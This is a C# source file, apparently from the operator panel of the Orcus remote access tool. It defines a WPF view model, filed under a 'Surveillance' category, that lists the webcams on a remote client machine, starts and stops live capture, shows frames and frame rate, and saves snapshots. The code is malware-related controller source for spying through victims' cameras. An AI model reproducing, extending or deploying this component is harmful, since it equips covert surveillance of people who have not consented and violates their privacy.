using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Microsoft.Win32;
using Orcus.Administration.Commands.Webcam;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Webcam;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(16)]
    public class WebcamViewModel : CommandView
    {
        private int _currentFps;
        private DispatcherTimer _dispatcherTimer;
        private bool _isEnabled;
        private bool _isStarting;
        private int _quality = 75;
        private RelayCommand _refreshWebcamsCommand;
        private RelayCommand _saveCurrentFrameCommand;
        private WebcamResolution _selectedResolution;
        private WebcamInfo _selectedWebcam;
        private RelayCommand _startWebcamCommand;
        private RelayCommand _stopWebcamCommand;
        private WebcamCommand _webcamCommand;
        private WriteableBitmap _webcameImage;
        private List<WebcamInfo> _webcams;

        public override string Name { get; } = (string) Application.Current.Resources["Webcam"];
        public override Category Category { get; } = Category.Surveillance;

        public List<WebcamInfo> Webcams
        {
            get { return _webcams; }
            set { SetProperty(value, ref _webcams); }
        }

        public WriteableBitmap WebcamImage
        {
            get { return _webcameImage; }
            set { SetProperty(value, ref _webcameImage); }
        }

        public int CurrentFps
        {
            get { return _currentFps; }
            set { SetProperty(value, ref _currentFps); }
        }

        public WebcamInfo SelectedWebcam
        {
            get { return _selectedWebcam; }
            set
            {
                if (SetProperty(value, ref _selectedWebcam))
                    _webcamCommand.Webcam = value;
            }
        }

        public WebcamResolution SelectedResolution
        {
            get { return _selectedResolution; }
            set
            {
                if (SetProperty(value, ref _selectedResolution))
                    _webcamCommand.WebcamResolution = value;
            }
        }

        public bool IsStarting
        {
            get { return _isStarting; }
            set { SetProperty(value, ref _isStarting); }
        }

        public bool IsEnabled
        {
            get { return _isEnabled; }
            set
            {
                if (value && !IsStarting)
                {
                    _webcamCommand.Start();
                    IsStarting = true;
                }
                else if (!value && !IsStarting)
                {
                    SetProperty(false, ref _isEnabled);
                    _webcamCommand.Stop();
                }
            }
        }

        public int Quality
        {
            get { return _quality; }
            set
            {
                if (SetProperty(value, ref _quality))
                    _webcamCommand.Quality = value;
            }
        }

        public RelayCommand RefreshWebcamsCommand
        {
            get
            {
                return _refreshWebcamsCommand ??
                       (_refreshWebcamsCommand = new RelayCommand(parameter => { _webcamCommand.GetWebcams(); }));
            }
        }

        public RelayCommand StartWebcamCommand
        {
            get
            {
                return _startWebcamCommand ??
                       (_startWebcamCommand = new RelayCommand(parameter => { IsEnabled = true; }));
            }
        }

        public RelayCommand StopWebcamCommand
        {
            get
            {
                return _stopWebcamCommand ?? (_stopWebcamCommand = new RelayCommand(parameter => { IsEnabled = false; }));
            }
        }

        public RelayCommand SaveCurrentFrameCommand
        {
            get
            {
                return _saveCurrentFrameCommand ?? (_saveCurrentFrameCommand = new RelayCommand(parameter =>
                {
                    if (WebcamImage == null)
                        return;

                    var currentFrame = WebcamImage.Clone();
                    currentFrame.Freeze();

                    var sfd = new SaveFileDialog
                    {
                        Filter = "PNG|*.png|GIF|*.gif|BMP|*.bmp|JPEG|*.jpg;*.jpeg",
                        AddExtension = true
                    };

                    if (sfd.ShowDialog() == true)
                    {
                        using (var fileStream = new FileStream(sfd.FileName, FileMode.Create))
                        {
                            BitmapEncoder encoder;
                            switch (sfd.FilterIndex)
                            {
                                case 1:
                                    encoder = new PngBitmapEncoder();
                                    break;
                                case 2:
                                    encoder = new GifBitmapEncoder();
                                    break;
                                case 3:
                                    encoder = new BmpBitmapEncoder();
                                    break;
                                case 4:
                                    encoder = new JpegBitmapEncoder();
                                    break;
                                default:
                                    WindowService.ShowMessageBox(
                                        (string) Application.Current.Resources["FormatNotFound"],
                                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                                        MessageBoxImage.Error);
                                    return;
                            }
                            encoder.Frames.Add(BitmapFrame.Create(currentFrame));
                            encoder.Save(fileStream);
                        }
                    }
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _webcamCommand = clientController.Commander.GetCommand<WebcamCommand>();
            _webcamCommand.WebcamsReceived += WebcamCommandOnWebcamsReceived;
            _webcamCommand.RefreshWriteableBitmap += WebcamCommandOnRefreshWriteableBitmap;
            _webcamCommand.Started += WebcamCommandOnStarted;
            _webcamCommand.StartFailed += WebcamCommandOnStartFailed;
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Camera_16x.png",
                    UriKind.Absolute));
        }

        private void WebcamCommandOnStartFailed(object sender, EventArgs e)
        {
            IsStarting = false;
            _isEnabled = false;
            OnPropertyChanged(nameof(IsEnabled));
            _dispatcherTimer.Stop();
        }

        private void WebcamCommandOnStarted(object sender, EventArgs e)
        {
            IsStarting = false;
            _isEnabled = true;
            OnPropertyChanged(nameof(IsEnabled));
            _dispatcherTimer.Start();
        }

        public override void LoadView(bool loadData)
        {
            _webcamCommand.GetWebcams();
            _dispatcherTimer = new DispatcherTimer {Interval = TimeSpan.FromSeconds(1)};
            _dispatcherTimer.Tick += DispatcherTimerOnTick;
        }

        private void WebcamCommandOnWebcamsReceived(object sender, List<WebcamInfo> e)
        {
            SelectedResolution = null;
            SelectedWebcam = null;
            Webcams = e;
            SelectedWebcam = Webcams.FirstOrDefault();
            SelectedResolution = SelectedWebcam?.AvailableResolutions.FirstOrDefault();
        }

        private void WebcamCommandOnRefreshWriteableBitmap(object sender, WriteableBitmap e)
        {
            WebcamImage = e;
        }

        private void DispatcherTimerOnTick(object sender, EventArgs eventArgs)
        {
            CurrentFps = _webcamCommand.FramesPerSecond;
        }
    }
}